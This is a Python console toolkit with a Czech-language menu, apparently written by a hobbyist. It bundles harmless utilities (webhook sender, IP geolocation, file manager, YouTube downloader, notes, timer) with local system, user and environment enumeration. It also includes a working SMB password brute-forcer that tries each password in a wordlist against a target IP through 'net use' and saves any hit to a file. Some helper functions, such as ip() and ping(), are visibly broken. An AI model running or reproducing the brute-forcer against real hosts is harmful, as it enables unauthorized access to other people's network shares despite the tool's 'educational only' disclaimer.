import random
import os
import json
import requests
import socket
import subprocess
import dns.resolver
import uuid
from pytube import YouTube
import time
import platform
import psutil
from colorama import Fore, Style, Back
from datetime import datetime
import getpass
import itertools
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from pathlib import Path


logo = """
     
    ▓█████▄  ▄▄▄       ███▄    █  ██▓▒██   ██▒           ██▓███ ▓██   ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
    ▒██▀ ██▌▒████▄     ██ ▀█   █ ▓██▒▒▒ █ █ ▒░          ▓██░  ██▒▒██  ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
    ░██   █▌▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒░░  █   ░          ▓██░ ██▓▒ ▒██ ██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
    ░▓█▄   ▌░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░ ░ █ █ ▒           ▒██▄█▓▒ ▒ ░ ▐██▓░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
    ░▒████▓  ▓█   ▓██▒▒██░   ▓██░░██░▒██▒ ▒██▒ ██▓  ██▓ ▒██▒ ░  ░ ░ ██▒▓░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
     ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓  ▒▒ ░ ░▓ ░ ▒▓▒  ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
     ░ ▒  ▒   ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░░░   ░▒ ░ ░▒   ░▒  ░▒ ░     ▓██ ░▒░     ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
     ░ ░  ░   ░   ▒      ░   ░ ░  ▒ ░ ░    ░   ░    ░   ░░       ▒ ▒ ░░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
       ░          ░  ░         ░  ░   ░    ░    ░    ░           ░ ░                  ░ ░      ░ ░      ░  ░      ░  
     ░                                          ░    ░           ░ ░                                                 
"""

#Funkce
def ip():
    hostname = socket.hostname()
    local_ip = socket.gethostname(hostname)
    return local_ip

def public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        return response.json()['ip']
    except Exception as e:
        return f"Chyba získávání public IP: {e}"

def dns_server():
    resolver = dns.resolver.Resolver()
    return resolver.nameservers

def ping(address):
    try:
        latency = ping(address, timeout=2)
        if latency:
            return f"Ping na {address}: {latency * 1000:.2f} ms"
        else:
            return f"{address} není dosažitelné."
    except Exception as e:
        return f"Chyba při pingování: {e}"

def packet_loss(address, count=4):
    try:
        result = subprocess.run(
            ["ping", "-c", str(count), address],
            stdout=subprocess.PIPE,
            text=True
        )
        output = result.stdout
        if "packet loss" in output:
            for line in output.split("\n"):
                if "packet loss" in line:
                    return line.strip()
        else:
            return "Packet loss informace není k dispozici."
    except Exception as e:
        return f"Chyba při získávání packet loss: {e}"
        
def get_ip_location(ip_address):
    try:
        response = requests.get(f'http://ipinfo.io/{ip_address}/json')
        iplokace = response.json()
        return iplokace
    except requests.RequestException as e:
        print(f"Chyba získávaní dat: {e}")
        return None

def webhook_sender():
    webhook = input("Zadej webhook: ")
    text = input("Zadej zprávu kterou chceš poslat: ")
    user = input("Zadej uživatele: ")
    if user == "":
        user = None
        pass
    payload = {
    'username': user,
    'content': text
    }
    response = requests.post(webhook, data=payload, headers={'Content-Type': 'application/json'})
    if response.status_code == 200:
        print("Úspěšně odesláno!")
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    else:
        print('Zpráva nebyla doručena. Error kód: ', {response.status_code})
        input("Zmáčkni libovolnou klávesu pro pokračování...")

def hwid():
    hwidkey = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return hwidkey

def file_manager():
    os.system("cls")
    print("1. Zobrazit soubory")
    print("2. Smazat soubor")
    print("3. Přesunout soubor")
    print("4. Zavřít")
    choice = int(input("Vyber možnost: "))
    if choice == 1:
        for file in os.listdir():
            print(file)
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif choice == 2:
        file = input("Zadej název souboru: ")
        os.remove(file)
        print(f"Soubor {file} byl smazán.")
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif choice == 3:
        source = input("Zadej zdrojový soubor: ")
        destination = input("Zadej cílovou cestu: ")
        os.rename(source, destination)
        print(f"Soubor byl přesunut.")
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif choice == 4:
        pass

def youtube_downloader():
    url = input("Vlož URL videa: ")
    yt = YouTube(url)
    print("Dostupné formáty:")
    for stream in yt.streams.filter(progressive=True):
        print(stream)
    itag = int(input("Vyber itag pro stažení: "))
    yt.streams.get_by_itag(itag).download()
    print("Stahování dokončeno!")

def notes_manager():
    print("1. Zapsat poznámku")
    print("2. Zobrazit poznámky")
    print("3. Zavřít")
    choice = int(input("Vyber možnost: "))
    if choice == 1:
        note = input("Napiš poznámku: ")
        with open("notes.txt", "a") as file:
            file.write(note + "\n")
    elif choice == 2:
        with open("notes.txt", "r") as file:
            print(file.read())
            input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif choice == 3:
        pass

def timer():
    seconds = int(input("Zadej čas v sekundách: "))
    while seconds > 0:
        print(f"Zbývá {seconds} sekund", end="\r")
        time.sleep(1)
        seconds -= 1
    print("\nČas vypršel!")
    input("Zmáčkni libovolnou klávesu pro pokračování...")

def system_info():
    print(f"Operační systém: {platform.system()} {platform.release()}")
    print(f"CPU: {platform.processor()}")
    print(f"RAM: {round(psutil.virtual_memory().total / 1e9, 2)} GB")
    print(f"Disková kapacita: {round(psutil.disk_usage('/').total / 1e9, 2)} GB")
    input("Zmáčkni libovolnou klávesu pro pokračování...")

def get_all_users():
    print("Seznam uložených uživatelů v počítači:")
    users = os.popen("net user").read()
    users_lines = users.split("\n")
    for line in users_lines[4:]:  # Vynechá hlavičku a popis
        if line.strip():  # Přeskočí prázdné řádky
            print(line.strip())

def network_drives():
    print("Připojené síťové disky:")
    drives = os.popen("net use").read()
    print(drives)

def windows_version():
    version = platform.version()
    release = platform.release()
    system = platform.system()
    print(f"Operační systém: {system}")
    print(f"Verze: {version}")
    print(f"Vydání: {release}")

def running_processes():
    print("Seznam spuštěných procesů:")
    for process in psutil.process_iter(['pid', 'name']):
        print(f"PID: {process.info['pid']}, Název: {process.info['name']}")

def current_user():
    user = getpass.getuser()
    print(f"Aktuální uživatel: {user}")

def environment_variables():
    print("Proměnné prostředí:")
    for key, value in os.environ.items():
        print(f"{key}: {value}")

def network_info():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"Název zařízení: {hostname}")
    print(f"Lokální IP: {local_ip}")
    print("Aktivní připojení:")
    connections = os.popen("netstat -a").read()
    print(connections)
    input("Zmáčkni libovolnou klávesu pro pokračování...")

def scheduled_tasks():
    print("Naplánované úlohy:")
    tasks = os.popen("schtasks").read()
    print(tasks)

def installed_programs():
    print("Seznam instalovaných programů:")
    programs = os.popen("wmic product get name").read()
    print(programs)

def connected_devices():
    print("Připojená zařízení:")
    devices = os.popen("wmic path CIM_LogicalDevice").read()
    print(devices)

def system_time():
    now = datetime.now()
    timezone = time.tzname
    print(f"Aktuální datum a čas: {now.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Časové pásmo: {timezone}")

def info():
    os.system("cls")
    print(Fore.BLACK + Back.RED + "Vítej v mojem nástroji! Zde si vyber z nástrojů, které chceš.")
    print("Vytvořeno danixem._.")
    print("2025")
    print("NEVYUŽÍVAT K NELEGÁLNÍM AKTIVITÁM!")
    print("POUZE PRO VZDĚLÁVACÍ A ZÁBAVNÍ ÚČELY!")
    input("Stisknutím libovolného tlačítka spustíte program...")
    print(Fore.WHITE + Back.BLACK)

def nacti_hesla(soubor_hesel):
    """
    Načte hesla z textového souboru.
    
    :param soubor_hesel: Název souboru s hesly.
    :return: Seznam hesel.
    """
    try:
        # Otevření souboru a načtení jeho obsahu
        with open(soubor_hesel, 'r', encoding='utf-8') as file:
            hesla = [line.strip() for line in file.readlines() if line.strip()]
            
            # Ladicí výpis pro kontrolu
            print(f"Načítám soubor: {soubor_hesel}")
            print(f"Počet řádků v souboru: {len(hesla)}")
            print(f"Prvních 5 hesel: {hesla[:5]}")
            
        if len(hesla) == 0:
            print("Soubor je prázdný nebo neobsahuje žádná platná hesla.")
        
        return hesla
    except FileNotFoundError:
        print(f"Soubor {soubor_hesel} nebyl nalezen.")
        return []


def smb_bruteforce(ip, uzivatel, heslo, pocet):
    print(f"[POKUS {pocet}] [{heslo}]")
    try:
        vysledek = subprocess.run(['net', 'use', f'\\\\{ip}', f'/user:{uzivatel}', heslo], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if vysledek.returncode == 0:
            print(f"\nHeslo bylo nalezeno! {heslo}")
            subprocess.run(['net', 'use', f'\\\\{ip}', '/d', '/y'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            smb_heslo = Path("smb_heslo.txt")
            with smb_heslo.open("w") as soubor:
                soubor.write(f"IP: {ip}\nUživatel: {uzivatel}\nHeslo: {heslo}")
            print(f"Heslo bylo uloženo do souboru: {smb_heslo}")
            return True
    except Exception as e:
        print(f"Chyba během pokusu: {e}")
    return False

def bruteforce_start():
    ip = input("Zadejte IP adresu: ")
    uzivatel = input("Zadejte uživatelské jméno: ")
    wordlist = input("Zadejte soubor s hesly: ")

    pocet = 1
    try:
        with open(wordlist, 'r') as soubor:
            for radek in soubor:
                heslo = radek.strip()
                if smb_bruteforce(ip, uzivatel, heslo, pocet):  # Zavolání pokusu o heslo
                    break
                pocet += 1
            else:
                print("Heslo nenalezeno :(")
    except FileNotFoundError:
        print(f"Chyba: Soubor {wordlist} nebyl nalezen.")


#Start
info()

#Menu
while True:
    os.system("title danix._.pytools")
    os.system("cls")
    print(Fore.RED + logo)
    print(Fore.WHITE + "{1} Informace o tomto nástroji          {6} YouTube downloader (WIP)")
    print("{2} Vypsat Hardware ID (HWID)           {7} Seznam uložených uživatelů")
    print("{3} Webhook sender                      {8} Připojené síťové disky")
    print("{4} IP lokátor                          {9} Verze Windows")
    print("{5} Správce Souborů                     {10} Seznam spuštěných procesů")
    print("{11} Aktuální uživatel                  {16} Instalované programy")
    print("{12} Proměnné prostředí                 {17} Připojená zařízení")
    print("{13} Síťové připojení a IP              {18} Naplánované úlohy")
    print("{14} Čas a datum systému                {19} Poznámkový blok")
    print("{15} Systémové informace                {20} Časovač / stopky")
    print("{21} SMB Bruteforcer")
    print("{0} Zavřít")

    print("")
    try:
        moznost = int(input(Fore.GREEN + "\033[1m" + "danix._. ¦ Vyber si možnost --> " + "\033[0m"))
    except ValueError:
        print("Zadej platné číslo!")
        input("Zmáčkni libovolnou klávesu pro pokračování...")
        continue

    if moznost == 1:
        info()
    elif moznost == 2:
        hwid = hwid()
        print("HWID: ", hwid)
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 3:
        webhook_sender()
    elif moznost == 4:
        ip = input("IP Adresa: ")
        location_data = get_ip_location(ip)
        if location_data:
            print(f"IP Adresa: {location_data.get('ip')}")
            print(f"Město: {location_data.get('city')}")
            print(f"Region: {location_data.get('region')}")
            print(f"Země: {location_data.get('country')}")
            print(f"Lokace: {location_data.get('loc')}")
            print(f"Organizace: {location_data.get('org')}")
            print(f"Časová zóna: {location_data.get('timezone')}")
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 5:
        file_manager()
    elif moznost == 6:
        youtube_downloader()
    elif moznost == 7:
        get_all_users()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 8:
        network_drives()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 9:
        windows_version()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 10:
        running_processes()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 11:
        current_user()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 12:
        environment_variables()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 13:
        network_info()
    elif moznost == 14:
        system_time()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 15:
        system_info()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 16:
        installed_programs()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 17:
        connected_devices()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 18:
        scheduled_tasks()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 19:
        notes_manager()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 20:
        timer()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 21:
        bruteforce_start()
        input("Zmáčkni libovolnou klávesu pro pokračování...")
    elif moznost == 0:
        break
    else:
        print("Nesprávná možnost.")
        input("Zmáčkni libovolnou klávesu pro pokračování...")